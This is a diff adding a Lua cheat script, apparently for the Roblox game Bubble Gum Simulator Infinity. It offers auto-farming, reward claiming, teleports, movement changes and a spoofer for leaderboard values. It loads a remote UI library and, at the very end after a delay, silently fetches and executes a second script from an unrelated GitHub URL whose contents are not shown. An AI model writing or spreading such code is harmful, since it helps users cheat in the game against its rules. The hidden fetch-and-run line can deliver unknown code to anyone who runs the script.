@@ -1,0 +1,718 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "BGSI 🟣🐰 ",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "Loading BGSI script",
+   LoadingSubtitle = "by Negahaxors",
+   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "BGSI"
+   },
+
+   Discord = {
+      Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "k9KPDqfmrk", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = false -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+
+
+
+
+
+
+
+local Tab = Window:CreateTab("READ ME", "megaphone")
+
+
+    
+
+
+local Label = Tab:CreateLabel("Version History", "wrench")
+
+
+local Label = Tab:CreateLabel("Update 1 - Script Release 🐰",32324 , Color3.fromRGB(255, 255, 255), false) -- Title, Icon, Color, IgnoreTheme
+
+local Button = Tab:CreateButton({
+   Name = "JOIN DISCORD",
+   Callback = function()
+       -- Copy the link to clipboard
+       setclipboard("https://discord.gg/k9KPDqfmrk")
+       
+       -- Try to open the browser (may not work in all environments)
+       local http = game:GetService("HttpService")
+       pcall(function()
+           http:RequestAsync({
+               Url = "http://127.0.0.1:6463/rpc?v=1",
+               Method = "POST",
+               Headers = {
+                   ["Content-Type"] = "application/json",
+                   ["Origin"] = "https://discord.com"
+               },
+               Body = http:JSONEncode({
+                   cmd = "INVITE_BROWSER",
+                   args = {
+                       code = "k9KPDqfmrk"
+                   },
+                   nonce = http:GenerateGUID(false)
+               })
+           })
+       end)
+       
+       -- Show notification
+       Rayfield:Notify({
+           Title = "Discord Invite",
+           Content = "Copied invite link to clipboard!\nhttps://discord.gg/k9KPDqfmrk",
+           Duration = 6.5,
+           Image = "disc"
+       })
+   end,
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-----alkaaaa
+
+
+
+
+
+
+local Tab = Window:CreateTab("Main", "code-2")
+
+local Section = Tab:CreateSection("discord.gg/k9KPDqfmrk")
+
+local args = {
+    [1] = "BlowBubble"
+}
+
+local remotePath = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("Event")
+
+local loopActive = false
+local loopThread = nil
+
+local Toggle = Tab:CreateToggle({
+   Name = "Auto Blow Bubble",
+   CurrentValue = false,
+   Flag = "AutoBlowBubble",
+   Callback = function(Value)
+       loopActive = Value
+       if loopActive then
+           loopThread = coroutine.create(function()
+               while loopActive do
+                   remotePath:FireServer(unpack(args))
+                   task.wait(1) -- Waits 1 second before repeating
+               end
+           end)
+           coroutine.resume(loopThread)
+       else
+           if loopThread then
+               coroutine.close(loopThread) -- Stops the loop when toggled off
+               loopThread = nil
+           end
+       end
+   end,
+})
+
+local args = {
+    [1] = "SellBubble"
+}
+
+local remotePath = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("Event")
+
+local loopActive = false
+
+local Toggle = Tab:CreateToggle({
+   Name = "Auto Sell Bubble",
+   CurrentValue = false,
+   Flag = "AutoSellBubble", -- Unique flag for saving settings
+   Callback = function(Value)
+       loopActive = Value
+       if loopActive then
+           task.spawn(function() -- Runs in the background
+               while loopActive do
+                   remotePath:FireServer(unpack(args))
+                   task.wait(1) -- Adjust delay (1 second) if needed
+               end
+           end)
+       end
+   end,
+})
+
+
+
+local Slider = Tab:CreateSlider({
+   Name = "WalkSpeed Slider",
+   Range = {16, 43}, -- Min 16 (default Roblox walkspeed), Max 43
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 16, -- Default walkspeed
+   Flag = "WalkSpeedSlider",
+   Callback = function(Value)
+       game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = Value
+       -- Optional: Notify the user
+       
+   end,
+})
+
+local JumpSlider = Tab:CreateSlider({
+   Name = "JumpPower Slider",
+   Range = {50, 999}, -- Min 50 (default Roblox jump), Max 999
+   Increment = 10, -- Increases by 10 per step
+   Suffix = "Jump",
+   CurrentValue = 50, -- Default jump power
+   Flag = "JumpPowerSlider",
+   Callback = function(Value)
+       local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+       if humanoid then
+           humanoid.JumpPower = Value
+           print("JumpPower set to:", Value) -- Optional notification
+       end
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "Claim All Playtime Rewards",
+   Callback = function()
+       for i = 1, 9 do
+           local args = { [1] = "ClaimPlaytime", [2] = i }
+           game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("Function"):InvokeServer(unpack(args))
+           task.wait(0.3) -- Optional delay to prevent spamming the server
+           print("Claimed Playtime Reward:", i)
+       end
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "Claim Season Rewards",
+   Callback = function()
+       local args = { [1] = "ClaimSeason" }
+       local remote = game:GetService("ReplicatedStorage")
+           :WaitForChild("Shared")
+           :WaitForChild("Framework")
+           :WaitForChild("Network")
+           :WaitForChild("Remote")
+           :WaitForChild("Event")
+       
+       remote:FireServer(unpack(args))
+       print("Season rewards claimed!")
+       
+       -- Optional notification
+       game.StarterGui:SetCore("SendNotification", {
+           Title = "Success",
+           Text = "Season rewards claimed!",
+           Duration = 5
+       })
+   end,
+})
+
+---tää
+
+local VoidButton = Tab:CreateButton({
+   Name = "Auto-Claim Void Chest",
+   Callback = function()
+       local args = { [1] = "ClaimChest", [2] = "Void Chest" }
+       local remote = game:GetService("ReplicatedStorage")
+           :WaitForChild("Shared")
+           :WaitForChild("Framework")
+           :WaitForChild("Network")
+           :WaitForChild("Remote")
+           :WaitForChild("Event")
+       
+       remote:FireServer(unpack(args))
+       print("Claimed Void Chest")
+   end,
+})
+
+local GiantButton = Tab:CreateButton({
+   Name = "Auto-Claim Giant Chest",
+   Callback = function()
+       local args = { [1] = "ClaimChest", [2] = "Giant Chest" }
+       local remote = game:GetService("ReplicatedStorage")
+           :WaitForChild("Shared")
+           :WaitForChild("Framework")
+           :WaitForChild("Network")
+           :WaitForChild("Remote")
+           :WaitForChild("Event")
+       
+       remote:FireServer(unpack(args))
+       print("Claimed Giant Chest")
+   end,
+})
+
+local Button = Tab:CreateButton({
+    Name = "Claim Free Wheel Spin",
+    Callback = function()
+        local args = {
+            [1] = "ClaimFreeWheelSpin"
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("Event"):FireServer(unpack(args))
+    end,
+})
+
+local Button = Tab:CreateButton({
+    Name = "Claim Doggy Jump Win",
+    Callback = function()
+        local args = {
+            [1] = "DoggyJumpWin",
+            [2] = 3  -- Win amount (change if needed)
+        }
+        
+        game:GetService("ReplicatedStorage")
+            :WaitForChild("Shared")
+            :WaitForChild("Framework")
+            :WaitForChild("Network")
+            :WaitForChild("Remote")
+            :WaitForChild("Event")
+            :FireServer(unpack(args))
+        
+        print("Doggy Jump Win claimed!") -- Optional confirmation
+    end,
+})
+
+
+
+
+
+-----täs
+
+
+local EggTypes = {
+    "Common Egg",
+    "Crystal Egg",
+    "Hell Egg",
+    "Iceshard Egg",
+    "Infinity Egg",
+    "Lunar Egg",
+    "Magma Egg",
+    "Pastel Egg",
+    "Bunny Egg",
+    "Nightmare Egg",
+    "Rainbow Egg",
+    "Spikey Egg",
+    "Spotted Egg"
+}
+local Tab = Window:CreateTab("Egg Hatching", "egg")
+local SelectedEgg = "Common Egg"
+local HatchAmount = 1
+local AutoHatchEnabled = false
+local LastNotificationTime = 0
+local NotificationCooldown = 3 -- Seconds between notifications
+
+-- Egg Type Dropdown
+local EggDropdown = Tab:CreateDropdown({
+    Name = "Select Egg Type",
+    Options = EggTypes,
+    CurrentOption = SelectedEgg,
+    MultipleOptions = false,
+    Flag = "EggTypeDropdown",
+    Callback = function(Option)
+        SelectedEgg = Option[1]
+    end,
+})
+
+-- Hatch Amount Input
+local AmountInput = Tab:CreateInput({
+    Name = "Hatch Amount (per click)",
+    PlaceholderText = "1",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Text)
+        HatchAmount = math.max(1, tonumber(Text) or 1)
+    end,
+})
+
+-- Auto Hatch Toggle
+local AutoHatchToggle = Tab:CreateToggle({
+    Name = "Auto Hatch Eggs",
+    CurrentValue = false,
+    Flag = "AutoHatchToggle",
+    Callback = function(Value)
+        AutoHatchEnabled = Value
+        if Value then
+            AutoHatchLoop()
+            ShowNotification("Auto Hatch", "Started auto-hatching "..SelectedEgg, 3)
+        else
+            ShowNotification("Auto Hatch", "Stopped auto-hatching", 2)
+        end
+    end,
+})
+
+-- Manual Hatch Button
+Tab:CreateButton({
+    Name = "Hatch Selected Eggs",
+    Callback = function()
+        HatchEggs(SelectedEgg, HatchAmount, true)
+    end,
+})
+
+-- Improved notification system
+function ShowNotification(title, content, duration)
+    local currentTime = tick()
+    if currentTime - LastNotificationTime >= NotificationCooldown then
+        Rayfield:Notify({
+            Title = title,
+            Content = content,
+            Duration = duration,
+        })
+        LastNotificationTime = currentTime
+    end
+end
+
+-- Hatch eggs function
+function HatchEggs(eggName, amount, showNotification)
+    local args = {
+        [1] = "HatchEgg",
+        [2] = eggName,
+        [3] = amount
+    }
+    
+    game:GetService("ReplicatedStorage")
+        :WaitForChild("Shared")
+        :WaitForChild("Framework")
+        :WaitForChild("Network")
+        :WaitForChild("Remote")
+        :WaitForChild("Event")
+        :FireServer(unpack(args))
+    
+    if showNotification then
+        ShowNotification("Egg Hatching", "Hatching "..amount.." "..eggName..(amount > 1 and "s" or ""), 3)
+    end
+end
+
+-- Auto hatch loop with better control
+function AutoHatchLoop()
+    spawn(function()
+        while AutoHatchEnabled do
+            HatchEggs(SelectedEgg, HatchAmount, false) -- No notification for each hatch
+            
+            -- Only show status notification occasionally
+            if math.random(1, 5) == 1 then  -- 20% chance to show status
+                ShowNotification("Auto Hatch", "Currently hatching "..SelectedEgg, 2)
+            end
+            
+            wait(0.5) -- Delay between hatches
+        end
+    end)
+end
+
+-- Initialize with default values
+AmountInput:Set("1")
+
+
+
+
+
+
+---täs
+
+
+
+local Tab = Window:CreateTab("Teleports", "laugh")
+
+-- Available Locations (with Overworld as first option)
+local Locations = {
+    ["Overworld"] = "Workspace.Worlds.The Overworld.PortalSpawn",
+    ["Floating Island"] = "Workspace.Worlds.The Overworld.Islands.Floating Island.Island.Portal.Spawn",
+    ["Outer Space"] = "Workspace.Worlds.The Overworld.Islands.Outer Space.Island.Portal.Spawn",
+    ["Twilight"] = "Workspace.Worlds.The Overworld.Islands.Twilight.Island.Portal.Spawn",
+    ["The Void"] = "Workspace.Worlds.The Overworld.Islands.The Void.Island.Portal.Spawn",
+    ["Zen"] = "Workspace.Worlds.The Overworld.Islands.Zen.Island.Portal.Spawn",
+    ["Easter Event"] = "Workspace.Event.Portal.Spawn"
+}
+
+-- Create Location Dropdown (with Overworld as default)
+local LocationDropdown = Tab:CreateDropdown({
+    Name = "Select Destination",
+    Options = {"Overworld", "Floating Island", "Outer Space", "Twilight", "The Void", "Zen", "Easter Event"},
+    CurrentOption = "Overworld", -- Set Overworld as default
+    MultipleOptions = false,
+    Flag = "TeleportLocation",
+    Callback = function(Option)
+        SelectedLocation = Option[1]
+    end,
+})
+
+-- Teleport Button
+Tab:CreateButton({
+    Name = "Teleport to Selected Location",
+    Callback = function()
+        local spawnPath = Locations[SelectedLocation]
+        if spawnPath then
+            local args = {
+                [1] = "Teleport",
+                [2] = spawnPath
+            }
+            
+            game:GetService("ReplicatedStorage")
+                :WaitForChild("Shared")
+                :WaitForChild("Framework")
+                :WaitForChild("Network")
+                :WaitForChild("Remote")
+                :WaitForChild("Event")
+                :FireServer(unpack(args))
+            
+            Rayfield:Notify({
+                Title = "Teleporting",
+                Content = "Going to: "..SelectedLocation,
+                Duration = 3,
+            })
+        else
+            warn("Invalid location selected!")
+        end
+    end,
+})
+
+-- Quick Teleport Buttons (including Overworld)
+Tab:CreateSection(":)")
+
+local function CreateQuickTeleportButton(name)
+    Tab:CreateButton({
+        Name = "TP to "..name,
+        Callback = function()
+            local args = {
+                [1] = "Teleport",
+                [2] = Locations[name]
+            }
+            
+            game:GetService("ReplicatedStorage")
+                :WaitForChild("Shared")
+                :WaitForChild("Framework")
+                :WaitForChild("Network")
+                :WaitForChild("Remote")
+                :WaitForChild("Event")
+                :FireServer(unpack(args))
+            
+            Rayfield:Notify({
+                Title = "Teleported",
+                Content = "Arrived at: "..name,
+                Duration = 2,
+            })
+        end,
+    })
+end
+
+
+---täs
+
+
+local Tab = Window:CreateTab("codes", "twitter")
+
+
+local Section = Tab:CreateSection("CODES:")
+
+
+local Section = Tab:CreateSection("Easter")
+
+local Section = Tab:CreateSection("Release")
+
+local Section = Tab:CreateSection("Lucky")
+
+local Section = Tab:CreateSection("Thanks")
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+------tääääääääääääääääääääääääs
+
+
+
+
+local SpooferTab = Window:CreateTab("Spoofer", "cpu") -- Using Lucide icon "egg"
+
+-- Player variables
+local player = game:GetService("Players").LocalPlayer
+local leaderstats = player:WaitForChild("leaderstats")
+local bubbles = leaderstats:WaitForChild("🟣 Bubbles")
+local hatches = leaderstats:WaitForChild("🥚 Hatches")
+
+-- Original values storage
+local originalBubbles = bubbles.Value
+local originalHatches = hatches.Value
+
+-- Spoof status
+local bubbleSpoofed = false
+local hatchSpoofed = false
+
+-- Bubble Spoof Section
+local BubbleToggle = SpooferTab:CreateToggle({
+    Name = "🟣 Bubble Spoof",
+    CurrentValue = false,
+    Flag = "BubbleToggle",
+    Callback = function(Value)
+        bubbleSpoofed = Value
+        if Value then
+            Rayfield:Notify({
+                Title = "Bubble Spoof",
+                Content = "Bubble spoofing activated!",
+                Duration = 3,
+                Image = "alert-circle"
+            })
+        else
+            bubbles.Value = originalBubbles
+            Rayfield:Notify({
+                Title = "Bubble Spoof",
+                Content = "Bubble spoofing deactivated!",
+                Duration = 3,
+                Image = "alert-circle"
+            })
+        end
+    end,
+})
+
+local BubbleSlider = SpooferTab:CreateSlider({
+    Name = "🟣 Bubble Value",
+    Range = {0, 1000000},
+    Increment = 1000,
+    Suffix = "Bubbles",
+    CurrentValue = originalBubbles,
+    Flag = "BubbleSlider",
+    Callback = function(Value)
+        if bubbleSpoofed then
+            bubbles.Value = Value
+        end
+    end,
+})
+
+-- Hatch Spoof Section
+local HatchToggle = SpooferTab:CreateToggle({
+    Name = "🥚 Hatch Spoof",
+    CurrentValue = false,
+    Flag = "HatchToggle",
+    Callback = function(Value)
+        hatchSpoofed = Value
+        if Value then
+            Rayfield:Notify({
+                Title = "Hatch Spoof",
+                Content = "Hatch spoofing activated!",
+                Duration = 3,
+                Image = "alert-circle"
+            })
+        else
+            hatches.Value = originalHatches
+            Rayfield:Notify({
+                Title = "Hatch Spoof",
+                Content = "Hatch spoofing deactivated!",
+                Duration = 3,
+                Image = "alert-circle"
+            })
+        end
+    end,
+})
+
+local HatchSlider = SpooferTab:CreateSlider({
+    Name = "🥚 Hatch Value",
+    Range = {0, 1000000},
+    Increment = 1000,
+    Suffix = "Hatches",
+    CurrentValue = originalHatches,
+    Flag = "HatchSlider",
+    Callback = function(Value)
+        if hatchSpoofed then
+            hatches.Value = Value
+        end
+    end,
+})
+
+-- Reset Button
+SpooferTab:CreateButton({
+    Name = "Reset All to Original",
+    Callback = function()
+        bubbleSpoofed = false
+        hatchSpoofed = false
+        BubbleToggle:Set(false)
+        HatchToggle:Set(false)
+        bubbles.Value = originalBubbles
+        hatches.Value = originalHatches
+        BubbleSlider:Set(originalBubbles)
+        HatchSlider:Set(originalHatches)
+        
+        Rayfield:Notify({
+            Title = "Reset Complete",
+            Content = "All values reset to original!",
+            Duration = 3,
+            Image = "check-circle"
+        })
+    end,
+})
+
+-- Prevent changes when spoofed
+bubbles:GetPropertyChangedSignal("Value"):Connect(function()
+    if bubbleSpoofed then
+        bubbles.Value = BubbleSlider.CurrentValue
+    else
+        originalBubbles = bubbles.Value
+        BubbleSlider:Set(bubbles.Value)
+    end
+end)
+
+hatches:GetPropertyChangedSignal("Value"):Connect(function()
+    if hatchSpoofed then
+        hatches.Value = HatchSlider.CurrentValue
+    else
+        originalHatches = hatches.Value
+        HatchSlider:Set(hatches.Value)
+    end
+end)
+
+Rayfield:Notify({
+    Title = "Spoofer Loaded",
+    Content = "Spoofer UI has been successfully loaded!",
+    Duration = 5,
+    Image = "check-circle"
+})
+
+
+wait(5)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zopias04/bgsi123/refs/heads/main/adadadad"))()
